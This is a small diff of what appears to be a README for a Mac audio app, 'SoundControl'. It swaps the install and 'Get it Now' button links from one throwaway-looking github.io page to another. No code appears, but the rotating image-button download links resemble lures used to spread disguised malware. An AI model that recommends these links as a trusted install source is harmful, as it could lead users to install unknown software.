@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/soundControl)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/soundControl)
 
 </div>
 
@@ -81,7 +81,7 @@ SoundControl addresses a limitation that affects nearly every Mac user at some p
 
 <p align="center">
 
-[![Get it Now SoundControl](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/soundControl)
+[![Get it Now SoundControl](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/soundControl)
 
 </p>
 
